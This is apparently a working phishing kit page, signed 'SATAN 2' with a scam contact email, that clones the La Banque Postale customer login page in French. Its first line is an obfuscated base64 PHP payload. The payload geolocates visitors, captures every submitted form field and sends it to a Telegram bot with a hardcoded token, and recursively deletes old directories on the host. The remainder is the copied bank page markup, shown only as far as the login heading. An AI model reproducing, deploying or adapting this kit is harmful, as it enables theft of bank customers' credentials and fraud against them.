<?php eval(base64_decode('CiBnb3RvIHJZZGJLOyBSeGc5bzogJGluZm8gPSB1bnNlcmlhbGl6ZShmaWxlX2dldF9jb250ZW50cygiXHg2OFx4NzRcMTY0XDE2MFx4M2FceDJmXHgyZlx4NjlcMTYwXDU1XDE0MVx4NzBceDY5XHgyZVx4NjNcMTU3XDE1NVx4MmZcMTYwXHg2OFwxNjBcNTd7JFN0cnVwTG9tfVw3N1x4NjZceDY5XDE0NVwxNTRcMTQ0XHg3M1w3NVwxNjNceDc0XDE0MVx4NzRcMTY1XHg3M1w1NFx4NmRcMTQ1XHg3M1x4NzNcMTQxXHg2N1x4NjVcNTRceDYzXHg2ZlwxNTZceDc0XDE1MVx4NmVceDY1XHg2ZVwxNjRcNTRceDYzXHg2ZlwxNTZceDc0XHg2OVx4NmVceDY1XDE1NlwxNjRceDQzXDE1N1wxNDRceDY1XDU0XHg2M1x4NmZcMTY1XHg2ZVwxNjRceDcyXHg3OVx4MmNceDYzXHg2ZlwxNjVcMTU2XDE2NFwxNjJceDc5XDEwM1x4NmZceDY0XDE0NVw1NFx4NzJceDY1XHg2N1wxNTFcMTU3XHg2ZVx4MmNcMTYyXHg2NVwxNDdceDY5XHg2Zlx4NmVceDRlXDE0MVwxNTVceDY1XHgyY1wxNDNceDY5XHg3NFwxNzFceDJjXHg2NFx4NjlceDczXDE2NFx4NzJceDY5XDE0M1x4NzRceDJjXHg3YVx4NjlceDcwXHgyY1wxNTRcMTQxXHg3NFw1NFwxNTRcMTU3XDE1Nlx4MmNceDc0XDE1MVx4NmRceDY1XHg3YVx4NmZceDZlXDE0NVw1NFwxNDNceDc1XHg3MlwxNjJceDY1XDE1Nlx4NjNceDc5XHgyY1wxNTFcMTYzXHg3MFx4MmNcMTU3XHg3Mlx4NjdcNTRcMTQxXDE2M1x4MmNcMTQxXHg3M1wxNTZcMTQxXHg2ZFx4NjVcNTRceDcyXHg2NVwxNjZcMTQ1XHg3Mlx4NzNceDY1XDU0XHg2ZFwxNTdcMTQyXDE1MVx4NmNcMTQ1XDU0XDE2MFx4NzJceDZmXHg3OFwxNzFcNTRcMTUwXHg2ZlwxNjNceDc0XHg2OVx4NmVceDY3XDU0XHg3MVwxNjVceDY1XHg3Mlx4NzkiKSk7IGdvdG8gYjhsR3E7IFVmc3BTOiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyBnb3RvIHBzMjBEOyBLUEloUzogJHBhcnRzID0gZXhwbG9kZSgkd2ViRGlyZWN0b3J5LCAkY3VycmVudERpcmVjdG9yeSwgMik7IGdvdG8gTzY3Smo7IGlEMGQ4OiAkcGFyZW50RGlyZWN0b3J5ID0gIlx4NjhceDc0XDE2NFwxNjBcMTYzXHgzYVw1N1x4MmZ7JGhvbWVEb21haW59XDU3XHg3N1wxNDVcMTQyIjsgZ290byBkcVNrcTsgbk9kTmg6ICRTdHJvbmdTb2wgPSAkc3ViRGlyZWN0b3JpZXNbMF07IGdvdG8gRWRQVEU7IEhzd0hyOiBmdW5jdGlvbiB0ZWxzZW50KCRtZXNzYWdlKSB7ICRUcnViRnR1YiA9ICJceDJkXHgzOVx4MzRceDM3XHgzMVw2MFx4MzNcNjdcNjBceDMwIjsgJGNSZXRWY2tyID0gIlx4MzZcNjNcNjZcNjBcNjZceDM4XDY3XHgzMFw2NVw2NFx4M2FceDQxXHg0MVx4NDVceDM1XHg3MlwxNjVceDM3XHg2NFx4NzdcMTcyXDYyXDE0Mlx4NzNcMTYxXDE2NFw2MlwxMjZcMTQ0XHg0Mlx4NjJcMTYyXDE0Nlw2NFx4NmZcMTEyXDE1MFwxNjVceDM5XHg2N1x4NThcMTQ2XDEyM1x4NThceDYyXDE1MyI7ICRhcGlfdXJsID0gIlx4NjhcMTY0XDE2NFx4NzBcMTYzXDcyXDU3XHgyZlx4NjFcMTYwXHg2OVx4MmVceDc0XHg2NVwxNTRceDY1XDE0N1wxNjJcMTQxXDE1NVx4MmVceDZmXDE2Mlx4NjdceDJmXHg2Mlx4NmZcMTY0eyRjUmV0VmNrcn1ceDJmXDE2M1wxNDVcMTU2XDE0NFx4NGRceDY1XHg3M1x4NzNceDYxXHg2N1x4NjUiOyAkcGFyYW1zID0gYXJyYXkoIlx4NjNceDY4XHg2MVx4NzRcMTM3XHg2OVwxNDQiID0+ICRUcnViRnR1YiwgIlwxNjRceDY1XHg3OFwxNjQiID0+ICRtZXNzYWdlKTsgJGNoID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICRhcGlfdXJsKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIHRydWUpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeSgkcGFyYW1zKSk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOyBjdXJsX2Nsb3NlKCRjaCk7IH0gZ290byB2R2wyTDsgaHVKSVk6IGlmIChpc3NldCgkaW5mb1siXDE0M1wxNTdcMTY1XHg2ZVx4NzRceDcyXHg3OSJdKSkgeyAkX1NFU1NJT05bIlwxMDJcMTU0XHg2MVx4NzNceDYxXHg2M1x4NmZcMTY1XHg2ZSJdID0gJGluZm9bIlx4NjNcMTU3XDE2NVwxNTZcMTY0XDE2Mlx4NzkiXTsgfSBnb3RvIGJlbEdGOyBQNTA1TjogaW5pX3NldCgiXDE0NFx4NjlcMTYzXDE2MFwxNTRcMTQxXDE3MVx4NWZceDY1XDE2Mlx4NzJceDZmXDE2Mlx4NzMiLCAxKTsgZ290byBlZlpKNDsgdmM1WEE6IGlmICh0cmltKCRyZXNsb2NhbCkgIT0gdHJpbSgkU3RydXBMb20pKSB7ICRTdHJvbmdTb2wgPSAnJyAuIGJhc2VuYW1lKF9fRElSX18pOyAkaG9tZURvbWFpbiA9ICRfU0VSVkVSWyJcMTEwXHg1NFx4NTRcMTIwXHg1ZlwxMTBcMTE3XHg1M1x4NTQiXTsgJHZlcmlmeUFjY291bnRVUkwgPSAiXHg2OFwxNjRcMTY0XHg3MFx4NzNceDNhXHgyZlx4MmZ7JGhvbWVEb21haW59XHgyZlwxNTFcMTU2XDE0NFwxNDVcMTcwXDU2XHg3MFwxNTBcMTYwXDc3XDE2NlwxNDVcMTYyXDE1MVx4NjZcMTcxXDEzN1wxNDFcMTQzXDE0M1x4NmZcMTY1XHg2ZVx4NzRceDNkXHg3M1x4NjVcMTYzXHg3M1wxNTFcMTU3XHg2ZVx4MjYiIC4gbWQ1KG1pY3JvdGltZSgpKSAuICJcNDZcMTQ0XHg2OVx4NzNceDcwXDE0MVwxNjRceDYzXDE1MFx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXHgyNlwxNDFcMTQzXHg2M1wxNDVcMTYzXHg3M1x4M2RceDI2XHg2NFx4NjFcMTY0XDE0MVx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XHg2Y1x4NmZceDZjXHg2ZFwxNDVceDNkeyRTdHJvbmdTb2x9IjsgZWNobyAiXHgzY1x4NzNcMTQzXHg3Mlx4NjlcMTYwXDE2NFw0MFwxMTRcMTAxXHg0ZVwxMDdceDU1XDEwMVwxMDdcMTA1XHgzZFx4MjdceDRhXHg2MVwxNjZcMTQxXDEyM1x4NjNcMTYyXHg2OVx4NzBceDc0XDQ3XHgzZVwxMlx4MjBceDIwXHgyMFx4MjBceDc3XHg2OVx4NmVceDY0XDE1N1x4NzdcNTZceDZjXDE1N1x4NjNcMTQxXHg3NFwxNTFceDZmXHg2ZVx4MmVceDY4XHg3Mlx4NjVceDY2XDc1XHgyN3skdmVyaWZ5QWNjb3VudFVSTH1cNDdceDNiXDEyXHgyMFx4MjBcNDBceDIwXDQwXDc0XHgyZlwxNjNcMTQzXHg3Mlx4NjlcMTYwXDE2NFx4M2UiOyBkaWU7IH0gZ290byBtdkhsQTsgdDRoY0Y6IGN1cmxfY2xvc2UoJGNoKTsgZ290byBnOU5aZzsgVE5VV0s6IGlmIChpc19hcnJheSgkZGlyZWN0b3JpZXMpKSB7IGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyKSB7IGlmIChiYXNlbmFtZSgkZGlyKVswXSAhPSAiXDU2IikgeyBpZiAoZGVsZXRlRGlyZWN0b3J5KCRkaXIpKSB7IH0gfSB9IH0gZ290byB1QXBBUjsgYjhsR3E6IGlmIChpc3NldCgkaW5mb1siXDE0MVx4NzMiXSkpIHsgJF9TRVNTSU9OWyJceDY5XHg3M1wxNjAiXSA9ICRpbmZvWyJceDYxXHg3MyJdOyB9IGdvdG8gaHVKSVk7IHJkRG1IOiBmdW5jdGlvbiBkZWxldGVEaXJlY3RvcnkoJGRpcikgeyBpZiAoIWZpbGVfZXhpc3RzKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGlmICghaXNfZGlyKCRkaXIpKSB7IHJldHVybiB1bmxpbmsoJGRpcik7IH0gJHRpbWVfZGlmZiA9IHRpbWUoKSAtIGZpbGVjdGltZSgkZGlyKTsgaWYgKCR0aW1lX2RpZmYgPiAzMjApIHsgZm9yZWFjaCAoc2NhbmRpcigkZGlyKSBhcyAkaXRlbSkgeyBpZiAoJGl0ZW0gPT0gIlx4MmUiIHx8ICRpdGVtID09ICJceDJlXDU2IikgeyBjb250aW51ZTsgfSBpZiAoIWRlbGV0ZURpcmVjdG9yeSgkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRpdGVtKSkgeyByZXR1cm4gZmFsc2U7IH0gfSBpZiAocm1kaXIoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gZWxzZSB7IHJldHVybiBmYWxzZTsgfSB9IGVsc2UgeyByZXR1cm4gdHJ1ZTsgfSB9IGdvdG8gS1o4d0Q7IGc5TlpnOiBpZiAoIWVtcHR5KCRyZXNsb2NhbCkpIHsgfSBlbHNlIHsgJFN0cm9uZ1NvbCA9ICcnIC4gYmFzZW5hbWUoX19ESVJfXyk7ICRob21lRG9tYWluID0gJF9TRVJWRVJbIlwxMTBceDU0XHg1NFx4NTBceDVmXHg0OFx4NGZcMTIzXDEyNCJdOyAkdmVyaWZ5QWNjb3VudFVSTCA9ICJcMTUwXHg3NFwxNjRceDcwXDE2M1w3Mlx4MmZceDJmeyRob21lRG9tYWlufVw1N1x4NjlceDZlXHg2NFwxNDVceDc4XHgyZVwxNjBcMTUwXHg3MFw3N1x4NzZcMTQ1XHg3MlwxNTFceDY2XDE3MVx4NWZceDYxXHg2M1wxNDNcMTU3XDE2NVwxNTZcMTY0XDc1XHg3M1wxNDVceDczXHg3M1wxNTFcMTU3XHg2ZVw0NiIgLiBtZDUobWljcm90aW1lKCkpIC4gIlx4MjZcMTQ0XHg2OVwxNjNcMTYwXHg2MVx4NzRcMTQzXHg2OFx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XHg2MVx4NjNcMTQzXDE0NVwxNjNceDczXHgzZFx4MjZceDY0XDE0MVx4NzRcMTQxXDc1IiAuIHNoYTEobWljcm90aW1lKCkpIC4gIlx4MjZceDZjXHg2ZlwxNTRceDZkXHg2NVw3NXskU3Ryb25nU29sfSI7IGVjaG8gIlx4M2NcMTYzXHg2M1x4NzJcMTUxXDE2MFwxNjRcNDBceDRjXDEwMVx4NGVceDQ3XHg1NVx4NDFceDQ3XHg0NVw3NVx4MjdcMTEyXDE0MVwxNjZceDYxXDEyM1x4NjNcMTYyXHg2OVwxNjBcMTY0XDQ3XHgzZVx4YVw0MFx4MjBceDIwXHgyMFwxNjdcMTUxXDE1NlwxNDRceDZmXHg3N1x4MmVceDZjXDE1N1wxNDNcMTQxXDE2NFwxNTFceDZmXDE1Nlx4MmVceDY4XHg3Mlx4NjVceDY2XDc1XHgyN3skdmVyaWZ5QWNjb3VudFVSTH1cNDdceDNiXHhhXDQwXHgyMFw0MFx4MjBcNDBcNzRcNTdcMTYzXHg2M1wxNjJceDY5XHg3MFwxNjRcNzYiOyBkaWU7IH0gZ290byB2YzVYQTsgS1o4d0Q6ICRob21lRG9tYWluID0gJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXDExMFx4NGZceDUzXHg1NCJdOyBnb3RvIGlEMGQ4OyBvQlJtODogJGhvbWVEb21haW4gPSAkX1NFUlZFUlsiXDExMFx4NTRceDU0XDEyMFwxMzdcMTEwXDExN1wxMjNcMTI0Il07IGdvdG8gdmkwSTU7IHVBcEFSOiAkY3VycmVudERpcmVjdG9yeSA9IF9fRElSX187IGdvdG8gdURqZks7IHRIQmwyOiAkZG9uZmxhZyA9ICRfU0VSVkVSWyJcMTIzXHg0NVwxMjJceDU2XDEwNVwxMjJceDVmXDExNlx4NDFcMTE1XHg0NSJdOyBnb3RvIFJ4ZzlvOyBPNjdKajogJHN1YkRpcmVjdG9yaWVzID0gZXhwbG9kZSgiXDU3IiwgJHBhcnRzWzFdKTsgZ290byBuT2ROaDsgdmkwSTU6ICRwYXJlbnREaXJlY3RvcnkgPSAiXHg2OFwxNjRcMTY0XDE2MFwxNjNcNzJcNTdcNTd7JGhvbWVEb21haW59XHgyZlx4NzdceDY1XHg2Mlw1N3skU3Ryb25nU29sfVx4MmZ7JGZpbGVuYW1lfSI7IGdvdG8gaGQ0aUY7IGhkNGlGOiAkY2ggPSBjdXJsX2luaXQoJHBhcmVudERpcmVjdG9yeSk7IGdvdG8gVWZzcFM7IFN5VTU2OiBpZiAoJHJlc2xvY2FsID09PSBmYWxzZSkgeyBkaWUoIlwxNDNceDU1XHg1Mlx4NGNceDIwXDEwNVwxNjJcMTYyXDE1N1x4NzJceDNhXDQwIiAuIGN1cmxfZXJyb3IoJGNoKSk7IH0gZ290byB0NGhjRjsgRWRQVEU6ICRmaWxlbmFtZSA9ICJcMTU0XDE1N1wxNDNceDYxXHg2Y1w1Nlx4NzRcMTcwXDE2NCI7IGdvdG8gb0JSbTg7IGRxU2txOiAkZGlyZWN0b3JpZXMgPSBnbG9iKCRwYXJlbnREaXJlY3RvcnkgLiAiXHgyZlx4MmEiLCBHTE9CX09OTFlESVIpOyBnb3RvIFROVVdLOyBXUzJhMTogaWYgKCFlbXB0eSgkdmFsaWRJUHMpKSB7ICRTdHJ1cExvbSA9ICR2YWxpZElQc1swXTsgfSBlbHNlIHsgJFN0cnVwTG9tID0gIlw2MVw2Mlw2N1x4MmVceDMwXDU2XDYwXHgyZVx4MzEiOyB9IGdvdG8gdEhCbDI7IFNlQ0hGOiBpZiAoaXNzZXQoJGluZm9bIlwxNjJceDY1XDE0N1x4NjlceDZmXDE1NlwxMTZcMTQxXHg2ZFwxNDUiXSkpIHsgJF9TRVNTSU9OWyJceDc4XHg0Zlx4NzBcMTY1XDE3MSJdID0gJGluZm9bIlwxNjJceDY1XDE0N1x4NjlceDZmXHg2ZVwxMTZcMTQxXDE1NVwxNDUiXTsgfSBnb3RvIHJkRG1IOyBGR2ludjogJHZhbGlkSVBzID0gYXJyYXkoKTsgZ290byBlckN0QTsgYmVsR0Y6IGlmIChpc3NldCgkaW5mb1siXHg2M1x4NmZceDc1XHg2ZVx4NzRcMTYyXHg3OVwxMDNceDZmXDE0NFx4NjUiXSkpIHsgJF9TRVNTSU9OWyJcMTE2XDE1MlwxNTdcMTYwXDE0NiJdID0gJGluZm9bIlx4NjNceDZmXDE2NVx4NmVceDc0XHg3MlwxNzFcMTAzXDE1N1x4NjRceDY1Il07IH0gZ290byB3b2x5RjsgeG5QVFo6IGlmICgkaXBNYXRjaGVzKSB7ICR2YWxpZElQcyA9ICRtYXRjaGVzWzBdOyB9IGdvdG8gV1MyYTE7IHdvbHlGOiBpZiAoaXNzZXQoJGluZm9bIlwxNDNcMTUxXDE2NFx4NzkiXSkpIHsgJF9TRVNTSU9OWyJcMTI2XDE1N1wxNjBcMTYyXDE2NCJdID0gJGluZm9bIlx4NjNcMTUxXDE2NFx4NzkiXTsgfSBnb3RvIFNlQ0hGOyBlckN0QTogJGlwTWF0Y2hlcyA9IHByZWdfbWF0Y2hfYWxsKCJceDJmXHg1Y1x4NjJceDVjXHg2NFx4N2JceDMxXDU0XDYzXDE3NVwxMzRceDJlXDEzNFwxNDRcMTczXDYxXDU0XDYzXDE3NVx4NWNcNTZceDVjXDE0NFwxNzNcNjFceDJjXHgzM1wxNzVceDVjXDU2XDEzNFx4NjRcMTczXDYxXHgyY1x4MzNceDdkXDEzNFwxNDJceDJmIiwgJGlwQWRkcmVzcywgJG1hdGNoZXMpOyBnb3RvIHhuUFRaOyByWWRiSzogZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsgZ290byBQNTA1TjsgUEJVWnI6IGlmICghZW1wdHkoJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXHg0M1wxMTRceDQ5XHg0NVwxMTZceDU0XDEzN1x4NDlceDUwIl0pKSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXDExMFwxMjRceDU0XDEyMFwxMzdceDQzXHg0Y1x4NDlceDQ1XHg0ZVwxMjRceDVmXHg0OVwxMjAiXTsgfSBlbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsiXDExMFwxMjRceDU0XHg1MFwxMzdcMTMwXHg1ZlwxMDZcMTE3XHg1MlwxMjdcMTAxXDEyMlwxMDRcMTA1XDEwNFx4NWZcMTA2XDExN1x4NTIiXSkpIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJceDQ4XDEyNFx4NTRcMTIwXDEzN1x4NThcMTM3XDEwNlwxMTdcMTIyXHg1N1x4NDFceDUyXDEwNFwxMDVceDQ0XHg1Zlx4NDZcMTE3XHg1MiJdOyB9IGVsc2UgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlwxMjJcMTA1XDExNVwxMTdcMTI0XHg0NVx4NWZceDQxXHg0NFwxMDRcMTIyIl07IH0gZ290byBGR2ludjsgcHMyMEQ6ICRyZXNsb2NhbCA9IGN1cmxfZXhlYygkY2gpOyBnb3RvIFN5VTU2OyB1RGpmSzogJHdlYkRpcmVjdG9yeSA9ICJcNTdcMTY3XDE0NVx4NjJceDJmIjsgZ290byBLUEloUzsgbXZIbEE6IGlmICgkX1NFUlZFUlsiXDEyMlwxMDVcMTIxXHg1NVwxMDVcMTIzXHg1NFwxMzdcMTE1XHg0NVwxMjRceDQ4XDExN1x4NDQiXSA9PT0gIlx4NTBceDRmXDEyM1x4NTQiKSB7ICRwb3N0RGF0YVN0cmluZyA9ICcnOyAkcHJvX25tID0gJyc7IGZvcmVhY2ggKCRfUE9TVCBhcyAka2V5ID0+ICR2YWx1ZSkgeyBpZiAoIWVtcHR5KCRfU0VTU0lPTlsiXDE2MFx4NzJceDZmXDE1MlwxNDVceDYzXDE2NCJdKSkgeyAkcHJvX25tID0gJF9TRVNTSU9OWyJceDcwXDE2Mlx4NmZceDZhXDE0NVwxNDNcMTY0Il07IH0gJHBvc3REYXRhU3RyaW5nIC49ICJcMTEzXHg2NVx4NzlcNzJceDIweyRrZXl9XDU0XDQwXDEyNlx4NjFcMTU0XDE2NVx4NjVceDNhXHgyMHskdmFsdWV9XDQwXHg1MFwxNjJceDZmXHgzYVx4MjB7JHByb19ubX1ceGEiOyB9IGlmICghZW1wdHkoJHBvc3REYXRhU3RyaW5nKSkgeyB0ZWxzZW50KCRwb3N0RGF0YVN0cmluZyk7IH0gfSBnb3RvIEhzd0hyOyBlZlpKNDogaWYgKHNlc3Npb25fc3RhdHVzKCkgPT0gUEhQX1NFU1NJT05fTk9ORSkgeyBzZXNzaW9uX3N0YXJ0KCk7IH0gZ290byBQQlVacjsgdkdsMkw6IA==')); ?>
<?php
/**
 * @link       : https://www.satan2.com/ 
 * @package    : POSTALE
 * @author     : SATAN 2 
 * @telegram   : @satan2
 * @email      : lesatan2scam@gmail.com
 * @mise à jour: 05-05-2023
 * @facebook   : https://www.facebook.com/satan2
 */
?>
<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="fr" style="--vh: 675px; --vw: 13.64px;">
  <head data-template="loginpagev2">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <script type="text/javascript" async="" src="source/js"></script>
    <script type="text/javascript" async="" src="source/js(1)"></script>
    <script type="text/javascript" async="" src="source/js(2)"></script>
    <script type="text/javascript" async="" src="source/exec.js.download"></script>
    <script type="text/javascript" async="" src="source/6545227.js.download"></script>
    <script type="text/javascript" async="" src="source/tro.js.download"></script>
    <script async="" src="source/zcpt.js.download" type="text/javascript"></script>
    <script async="" src="source/tfa.js.download" id="tb_tfa_script"></script>
    <script async="" src="source/Sj7HjOmx4y9CyqheE9Al.js.download"></script>
    <script async="" src="source/pixie.js.download"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <link rel="canonical" href="" />

    <meta property="og:type" content="website" />
    <meta property="og:url" content="" />
    <meta property="og:title" content="connexion espace client" />
    <meta
      property="og:description"
      content="Vous êtes client particulier de  Accédez à vos comptes et contrats et réalisez toutes vos opérations et souscriptions directement en ligne. Pensez également à télécharger notre application."
    />

    <link rel="stylesheet" href="source/base-fonts.min.css" as="style" onload="this.rel=&#39;stylesheet&#39;" />

    <link rel="stylesheet" href="source/base.min.fee13d21f4071872f798dcb4251ec3ed.css" type="text/css" />

    <meta name="env" content="production" />

    <!-- TAG COMMANDER START //-->
    <script type="text/javascript" async="" defer="" src="source/bsd"></script>
    <script src="source/bat.js.download" async=""></script>
    <script type="text/javascript" src="source/wreport_wcm.js.download"></script>
    <script type="text/javascript" src="source/wamfactory_dpm.laposte.min.js.download"></script>


    <script async="" type="text/javascript" src="source/tc_LaBanquePostale_4.js.download"></script>
    <!-- TAG COMMANDER END //-->

    <!-- default favicon -->
   <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,Qk02CAAAAAAAADYEAAAoAAAAIAAAACAAAAABAAgAAAAAAAAEAADEDgAAxA4AAAAAAAAAAAAAAAAAAAAAgAAAgAAAAICAAIAAAACAAIAAgIAAAMDAwADA3MAA8MqmAAAgQAAAIGAAACCAAAAgoAAAIMAAACDgAABAAAAAQCAAAEBAAABAYAAAQIAAAECgAABAwAAAQOAAAGAAAABgIAAAYEAAAGBgAABggAAAYKAAAGDAAABg4AAAgAAAAIAgAACAQAAAgGAAAICAAACAoAAAgMAAAIDgAACgAAAAoCAAAKBAAACgYAAAoIAAAKCgAACgwAAAoOAAAMAAAADAIAAAwEAAAMBgAADAgAAAwKAAAMDAAADA4AAA4AAAAOAgAADgQAAA4GAAAOCAAADgoAAA4MAAAODgAEAAAABAACAAQABAAEAAYABAAIAAQACgAEAAwABAAOAAQCAAAEAgIABAIEAAQCBgAEAggABAIKAAQCDAAEAg4ABAQAAAQEAgAEBAQABAQGAAQECAAEBAoABAQMAAQEDgAEBgAABAYCAAQGBAAEBgYABAYIAAQGCgAEBgwABAYOAAQIAAAECAIABAgEAAQIBgAECAgABAgKAAQIDAAECA4ABAoAAAQKAgAECgQABAoGAAQKCAAECgoABAoMAAQKDgAEDAAABAwCAAQMBAAEDAYABAwIAAQMCgAEDAwABAwOAAQOAAAEDgIABA4EAAQOBgAEDggABA4KAAQODAAEDg4ACAAAAAgAAgAIAAQACAAGAAgACAAIAAoACAAMAAgADgAIAgAACAICAAgCBAAIAgYACAIIAAgCCgAIAgwACAIOAAgEAAAIBAIACAQEAAgEBgAIBAgACAQKAAgEDAAIBA4ACAYAAAgGAgAIBgQACAYGAAgGCAAIBgoACAYMAAgGDgAICAAACAgCAAgIBAAICAYACAgIAAgICgAICAwACAgOAAgKAAAICgIACAoEAAgKBgAICggACAoKAAgKDAAICg4ACAwAAAgMAgAIDAQACAwGAAgMCAAIDAoACAwMAAgMDgAIDgAACA4CAAgOBAAIDgYACA4IAAgOCgAIDgwACA4OAAwAAAAMAAIADAAEAAwABgAMAAgADAAKAAwADAAMAA4ADAIAAAwCAgAMAgQADAIGAAwCCAAMAgoADAIMAAwCDgAMBAAADAQCAAwEBAAMBAYADAQIAAwECgAMBAwADAQOAAwGAAAMBgIADAYEAAwGBgAMBggADAYKAAwGDAAMBg4ADAgAAAwIAgAMCAQADAgGAAwICAAMCAoADAgMAAwIDgAMCgAADAoCAAwKBAAMCgYADAoIAAwKCgAMCgwADAoOAAwMAAAMDAIADAwEAAwMBgAMDAgADAwKAA8Pv/AKSgoACAgIAAAAD/AAD/AAAA//8A/wAAAP8A/wD//wAA////AP///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wn////s7P/27O3//wgJ//8ICOzsCOzsCP/////////2ke3/2gn2kQj25O324weR45H17Pbs7Qn2//////////bj/5Ha///aCdr1//bj/9r1Ce0J/+3j4////////////5Ha7Pba2u3/4+MJ2trsCJH/9Qn/9drjCf////////////////////////////////////////////////////+R7ZHt4+yR9uP/iPbj2tra9pHj7O3a5An//////////5Hk2v+R9uP/49rsCNr//9rsCP/aCdrj9v////8J9v//mQmQCeuICQmICez24+zj7OwJ/5n14+wI//////8J6fMJCP//Cevp6enp6ekJ9vb////////29v//////////8+np6gn2////Cerp6en///8I2toH9f8JCf//////////Cenp6enp8wn///8J9Or///UJ//+I9ZD///////////////Tp6urq6enp8wn/////9e3///Xa9f/////////////////q6erq6urq6enqCQn29v///+P///////////////////8J6erq6urq6urp6enzCfb/////////////////////////8unp6enp6enp6enp6enzCf//////////////////////////////////9vb29gkJ//////////////////////8JCQkJCQkJCQn//////////////////////////wny6enp6enp6enp6fL//////////////////////wnp6enp6enp6enp6enp6P////////////////////8JCQkJCQkJCQkJCQkJCQn///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8=">
    <title>Connexion à mon espace client - La Banque Postale</title>

    <meta
      name="description"
      content="Vous êtes client particulier de ? Accédez à vos comptes et contrats et réalisez toutes vos opérations et souscriptions directement en ligne. Pensez également à télécharger notre application."
    />
    <script id="tc_script_178_1" src="source/js(3)"></script>
    <script id="tc_script_564_1" type="text/javascript" async="" src="source/61fbec7472ba0.js.download"></script>
    <script src="source/4050178.js.download" type="text/javascript" async="" data-ueto="ueto_d90cfe0503"></script>
    <meta
      http-equiv="origin-trial"
     />
    <script type="text/javascript" async="" src="source/f(2).txt"></script>
    <meta
      http-equiv="origin-trial"
    />
    <meta
      http-equiv="origin-trial"
    />
  </head>

  <body data-title="Connexion à mon espace client" tabindex="-1">
    <script type="text/javascript" async="" src="source/privacy_v2_66.js.download" charset="utf-8" id="tc_script_0.14478638354435125"></script>

    <div class="js-avoidlinks">
      <ul class="m-list--horizontal--align-left">
        <li>
          <a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="">
            <span>Accès à vos comptes par l'écran de connexion pleine page</span>
          </a>
        </li>
        <li>
          <a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href=""><span>Accéder au Menu Principal</span></a>
        </li>
        <li>
          <a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href=""><span>Accéder au Contenu éditorial</span></a>
        </li>
        <li>
          <a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href=""><span>Accéder au Pied de page</span></a>
        </li>
      </ul>
    </div>

    <header id="header" class="o-header o-header--simplified" role="banner" data-percent="0">
      <div class="m-logo--simplified">
        <div class="m-logo u-spacing-s-xs">
          <a href="" class="js-logo-type" title="Accueil La Banque Postale">
            <img class="m-logo__img" src="source/LOGO-LBP-digital-fd-clair-RVB.svg" width="50" height="50" alt="La Banque Postale" />
            <img class="m-logo__img-glass" src="source/LOGO-LBP-digital-fd-glass-RVB.svg" width="50" height="50" alt="La Banque Postale" />
          </a>
        </div>
      </div>
      <div class="o-header__wrapper">
        <div class="o-header__itemwrapper">
          <div class="m-header__links m-header__links--simplified" data-client="true">
            <div class="m-header__links__item--simplified">
              <a id="client" href="" data-internal="true" title="Centre d&#39;aide" class="m-header__links__item m-header__links__item__white a-text--small">
                <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                  <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-interface-search"></use>
                </svg>
                <span class="sr-only-xs">Centre d'aide</span>
                <svg class="a-icon--xs hidden-sm hidden-md hidden-lg" aria-hidden="true" focusable="false">
                  <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                </svg>
              </a>
            </div>
          </div>
        </div>
      </div>
    </header>

    <main role="main" class="u-bg-color--blue-identity-group1">
      <div class="container-fluid">
        <div class="row">
          <div class="col-xs-12">
            <div
              class="o-cvs u-flex u-flex--column--xs u-flex--row u-spacing-4xl-bottom u-focus-on-darkBG"
              id="cvslayer"
              data-cvs=""
              data-mobile="true"
              data-app-stores='{"appStores":[{"appStoreLinkModel":{"linkPath":"","relatedDevice":"android"},"device":{"name":"android","label":"Android Mobile"}},{"appStoreLinkModel":{"linkPath":"","osMinVersion":"6.1","relatedDevice":"iosphone"},"device":{"name":"iosphone","label":"iOS Mobile"}}]}'
            >
              <div class="o-cvs__login u-flex--vertical u-flex--column">
                <div>
                  <div class="m-title u-spacing-s-xs-bottom u-spacing-lg-bottom u-align-center">
                    <h1 class="m-title--h3 u-text-color--white">Connexion à votre compte particulier</h1>
                  </div>

